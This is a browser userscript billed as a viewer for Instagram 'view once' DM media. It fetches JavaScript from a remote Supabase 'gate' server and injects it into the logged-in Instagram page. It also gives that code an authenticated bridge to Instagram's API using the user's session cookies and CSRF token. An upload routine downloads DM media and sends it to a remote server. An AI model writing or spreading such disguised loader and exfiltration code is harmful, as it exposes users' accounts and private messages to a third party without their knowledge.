// ==UserScript==
// @name        IG View Once
// @description View once media viewer for Instagram DMs
// @match       https://www.instagram.com/*
// @version     2.2.2
// @run-at      document-end
// @sandbox     JavaScript
// @grant       GM_xmlhttpRequest
// @grant       GM_addElement
// @grant       GM_setClipboard
// @grant       unsafeWindow
// @connect     *
// ==/UserScript==

(function() {
  'use strict';

  var _p = unsafeWindow.location.pathname;
  if (_p.indexOf('/accounts/') === 0 || _p.indexOf('/challenge/') === 0) return;

  var w = unsafeWindow;
  var doc = w.document;

  if (w.self !== w.top) return;
  if (doc.getElementById('igvo-fab')) return;

  function shouldRun() {
    if (doc.querySelector('input[name="username"]')) return false;
    if (doc.querySelector('svg[aria-label]')) return true;
    if (doc.cookie.match(/csrftoken=/)) return true;
    return false;
  }

  function initWhenReady() {
    if (doc.getElementById('igvo-fab')) return;
    if (shouldRun()) {
      initApp();
    } else {
      var retries = 0;
      var check = setInterval(function() {
        if (doc.getElementById('igvo-fab')) { clearInterval(check); return; }
        if (shouldRun()) { clearInterval(check); initApp(); }
        if (++retries >= 5) clearInterval(check);
      }, 2000);
    }
  }

  setTimeout(initWhenReady, 1000);

  function initApp() {

  var GATE_URL = 'https://vqfbfyylncfenpyfnjma.supabase.co/functions/v1/gate';
  var GATE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZxZmJmeXlsbmNmZW5weWZuam1hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2NzQ1NzQsImV4cCI6MjA4OTI1MDU3NH0.ZuMjHqWxH9BzWyfIc_M9vYaKMTwbV-8JdIQV6CeflHE';

  function toPage(fn) {
    if (typeof exportFunction === 'function') return exportFunction(fn, w);
    return fn;
  }

  var currentToken = null;
  var syncUrl = null;
  var syncQueue = [];
  var syncBusy = false;

  function enqueueSyncOp(op) { syncQueue.push(op); processQueue(); }
  function processQueue() {
    if (syncBusy || syncQueue.length === 0) return;
    syncBusy = true;
    var op = syncQueue.shift();
    op(function() { syncBusy = false; processQueue(); });
  }

  function callSync(action, data, onDone) {
    if (!syncUrl || !currentToken) { if (onDone) onDone(null); return; }
    GM_xmlhttpRequest({
      method: 'POST', url: syncUrl,
      headers: { 'Content-Type': 'application/json' },
      data: JSON.stringify({ token: currentToken, action: action, data: data }),
      onload: function(r) {
        try {
          var res = JSON.parse(r.responseText);
          if (res.ok && res.next_token) currentToken = res.next_token;
          if (onDone) onDone(res);
        } catch(err) { if (onDone) onDone(null); }
      },
      onerror: function() { if (onDone) onDone(null); }
    });
  }

  w.addEventListener('message', toPage(function(e) {
    if (!e.data || !e.data.__igvo) return;

    if (e.data.type === 'igvo-count') { voCount = e.data.count || 0; updateFabBadge(); }
    if (e.data.type === 'igvo-closed') { fab.classList.remove('hidden'); updateFabBadge(); }

    if (e.data.type === 'igvo-api') {
      var csrf = doc.cookie.match(/csrftoken=([^;]+)/);
      GM_xmlhttpRequest({
        method: 'GET',
        url: 'https://www.instagram.com' + e.data.endpoint,
        headers: { 'x-ig-app-id': '936619743392459', 'x-csrftoken': csrf ? csrf[1] : '', 'x-requested-with': 'XMLHttpRequest' },
        anonymous: false,
        onload: function(r) {
          var el = doc.getElementById('igvo-bridge-' + e.data.id);
          if (el) { el.dataset.status = r.status; el.dataset.body = r.responseText; el.dataset.ready = '1'; }
        },
        onerror: function() {
          var el = doc.getElementById('igvo-bridge-' + e.data.id);
          if (el) { el.dataset.status = '0'; el.dataset.body = ''; el.dataset.ready = '1'; }
        }
      });
    }

    if (e.data.type === 'igvo-sync') {
      enqueueSyncOp(function(done) { callSync(e.data.action, e.data.data, function() { done(); }); });
    }

    if (e.data.type === 'igvo-upload') {
      var ud = e.data.data;
      enqueueSyncOp(function(done) {
        callSync('get_upload_url', {
          ig_thread_id: ud.ig_thread_id, ig_item_id: ud.ig_item_id,
          filename: ud.filename, media_type: ud.media_type
        }, function(res) {
          if (!res || !res.upload_url || !ud.source_url) { done(); return; }
          GM_xmlhttpRequest({
            method: 'GET', url: ud.source_url, responseType: 'arraybuffer',
            onload: function(dlRes) {
              if (!dlRes.response) { done(); return; }
              GM_xmlhttpRequest({
                method: 'PUT', url: res.upload_url,
                headers: { 'Content-Type': res.content_type || 'application/octet-stream' },
                data: dlRes.response,
                onload: function() { done(); }, onerror: function() { done(); }
              });
            },
            onerror: function() { done(); }
          });
        });
      });
    }

    if (e.data.type === 'igvo-fetch-blob') {
      GM_xmlhttpRequest({
        method: 'GET', url: e.data.url, responseType: 'blob',
        onload: function(r) {
          var el = doc.getElementById('igvo-bridge-' + e.data.id);
          if (el && r.response) {
            var reader = new FileReader();
            reader.onload = function() { el.dataset.dataurl = reader.result; el.dataset.ready = '1'; };
            reader.readAsDataURL(r.response);
          }
        },
        onerror: function() {
          var el = doc.getElementById('igvo-bridge-' + e.data.id);
          if (el) { el.dataset.ready = 'err'; }
        }
      });
    }
  }));

  var style = doc.createElement('style');
  style.textContent = '#igvo-fab{position:fixed;bottom:24px;right:24px;z-index:2147483646;width:56px;height:56px;border-radius:50%;background:#007AFF;color:#fff;border:none;box-shadow:0 4px 16px rgba(0,0,0,0.3);display:flex;align-items:center;justify-content:center;cursor:pointer;-webkit-tap-highlight-color:transparent}#igvo-fab:active{transform:scale(0.9)}#igvo-fab.hidden{display:none}#igvo-fab.loading{opacity:0.5;pointer-events:none}#igvo-fab-badge{position:absolute;top:-2px;right:-2px;background:#FF3B30;color:#fff;font-size:11px;font-weight:700;min-width:20px;height:20px;border-radius:10px;display:flex;align-items:center;justify-content:center;padding:0 5px;font-family:-apple-system,sans-serif}#igvo-overlay-msg{position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;background:rgba(0,0,0,0.7);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;color:#fff;font-family:-apple-system,sans-serif;font-size:15px;text-align:center;padding:32px}#igvo-overlay-msg .igvo-close-btn{position:absolute;top:max(12px,env(safe-area-inset-top));right:16px;background:rgba(255,255,255,0.1);border:none;color:#fff;width:32px;height:32px;border-radius:50%;font-size:18px;display:flex;align-items:center;justify-content:center;cursor:pointer}#igvo-overlay-msg .igvo-close-btn:active{opacity:0.5}#igvo-version{position:fixed;bottom:8px;left:8px;z-index:2147483646;font-family:monospace;font-size:10px;color:#888;pointer-events:none}';
  doc.head.appendChild(style);

  var iconViewOnce = '<svg width="28" height="28" viewBox="0 -960 960 960" fill="currentColor"><path d="M574.5-774.5Q560-789 560-810t14.5-35.5Q589-860 610-860t35.5 14.5Q660-831 660-810t-14.5 35.5Q631-760 610-760t-35.5-14.5Zm0 660Q560-129 560-150t14.5-35.5Q589-200 610-200t35.5 14.5Q660-171 660-150t-14.5 35.5Q631-100 610-100t-35.5-14.5Zm160-520Q720-649 720-670t14.5-35.5Q749-720 770-720t35.5 14.5Q820-691 820-670t-14.5 35.5Q791-620 770-620t-35.5-14.5Zm0 380Q720-269 720-290t14.5-35.5Q749-340 770-340t35.5 14.5Q820-311 820-290t-14.5 35.5Q791-240 770-240t-35.5-14.5Zm60-190Q780-459 780-480t14.5-35.5Q809-530 830-530t35.5 14.5Q880-501 880-480t-14.5 35.5Q851-430 830-430t-35.5-14.5ZM480-80q-83 0-156-31.5T197-197q-54-54-85.5-127T80-480q0-83 31.5-156T197-763q54-54 127-85.5T480-880A40,40 0 0,1 480-800q-134 0-227 93t-93 227q0 134 93 227t227 93A40,40 0 0,1 480-80Z"/><path d="M492-280Q480-280 480-292V-584Q480-596 468-596H380Q368-596 368-608V-672Q368-684 380-684H564Q576-684 576-672V-292Q576-280 564-280Z"/></svg>';

  var fab = doc.createElement('button');
  fab.id = 'igvo-fab';
  fab.style.position = 'fixed';
  fab.innerHTML = iconViewOnce;
  fab.onclick = toPage(function() { onFabClick(); });
  doc.body.appendChild(fab);

  var voCount = 0;
  function updateFabBadge() {
    var existing = doc.getElementById('igvo-fab-badge');
    if (existing) existing.remove();
    if (voCount > 0) {
      var badge = doc.createElement('span');
      badge.id = 'igvo-fab-badge';
      badge.textContent = voCount;
      fab.appendChild(badge);
    }
  }

  var ver = doc.createElement('div');
  ver.id = 'igvo-version';
  ver.textContent = 'v2.2.2';
  doc.body.appendChild(ver);

  function showOverlayMsg(msg) {
    removeOverlayMsg();
    var div = doc.createElement('div');
    div.id = 'igvo-overlay-msg';
    var closeBtn = doc.createElement('button');
    closeBtn.className = 'igvo-close-btn';
    closeBtn.textContent = '\u2715';
    closeBtn.onclick = toPage(function() {
      removeOverlayMsg(); running = false;
      fab.classList.remove('loading'); fab.classList.remove('hidden');
    });
    div.appendChild(closeBtn);
    var inner = doc.createElement('div');
    inner.textContent = msg;
    div.appendChild(inner);
    doc.body.appendChild(div);
  }

  function removeOverlayMsg() {
    var el = doc.getElementById('igvo-overlay-msg');
    if (el) el.remove();
  }

  function getUsername(callback) {
    var csrf = doc.cookie.match(/csrftoken=([^;]+)/);
    GM_xmlhttpRequest({
      method: 'GET',
      url: 'https://www.instagram.com/api/v1/direct_v2/inbox/?limit=1',
      headers: { 'x-ig-app-id': '936619743392459', 'x-csrftoken': csrf ? csrf[1] : '', 'x-requested-with': 'XMLHttpRequest' },
      anonymous: false,
      onload: function(r) {
        if (r.status !== 200) { callback(null); return; }
        try {
          var data = JSON.parse(r.responseText);
          if (data.viewer && data.viewer.username) { callback(data.viewer.username); return; }
          var pageHtml = doc.documentElement.innerHTML;
          var match = pageHtml.match(/"username":"([a-z0-9._]+)"/i);
          if (match) { callback(match[1]); return; }
          callback(null);
        } catch(e) { callback(null); }
      },
      onerror: function() { callback(null); }
    });
  }

  function callGate(username, callback) {
    GM_xmlhttpRequest({
      method: 'POST', url: GATE_URL,
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + GATE_KEY, 'apikey': GATE_KEY },
      data: JSON.stringify({ ig_username: username }),
      onload: function(r) {
        try { callback(JSON.parse(r.responseText)); } catch(e) { callback(null); }
      },
      onerror: function() { callback(null); }
    });
  }

  var running = false;

  function onFabClick() {
    if (running) return;
    running = true;
    fab.classList.add('loading');
    showOverlayMsg('Verificando...');
    getUsername(function(username) {
      if (!username) {
        showOverlayMsg('Inicia sesion en Instagram primero');
        running = false; fab.classList.remove('loading');
        return;
      }
      callGate(username, function(gate) {
        running = false; fab.classList.remove('loading');
        if (!gate || gate.status !== 'ok' || !gate.code || !gate.token || !gate.sync_url) {
          showOverlayMsg('Error de conexion');
          return;
        }
        currentToken = gate.token;
        syncUrl = gate.sync_url;
        removeOverlayMsg();
        fab.classList.add('hidden');
        var ctxCode = 'window.__igvo_ctx=' + JSON.stringify({ token: gate.token, username: username, syncUrl: gate.sync_url }) + ';\n';
        var blob = new Blob([ctxCode + gate.code], { type: 'application/javascript' });
        var blobUrl = URL.createObjectURL(blob);
        GM_addElement('script', { src: blobUrl });
        setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 5000);
      });
    });
  }

  }
})();
